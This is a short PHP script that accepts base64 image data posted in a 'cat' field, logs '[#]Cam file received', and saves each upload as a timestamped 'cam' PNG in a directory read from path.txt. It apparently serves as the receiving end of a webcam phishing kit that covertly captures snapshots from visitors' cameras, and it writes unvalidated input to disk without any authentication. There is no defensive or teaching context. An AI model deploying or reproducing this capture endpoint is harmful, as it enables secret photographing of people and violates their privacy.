<?php
$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!empty($_POST['cat'])) {
error_log("[#]Cam file received" . "\r\n", 3, "Log.log");
}
$mypath = file_get_contents("path.txt");
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$myFile = $mypath.'cam'.$date.'.png';
$fp = fopen( $myFile, 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
exit();
?>



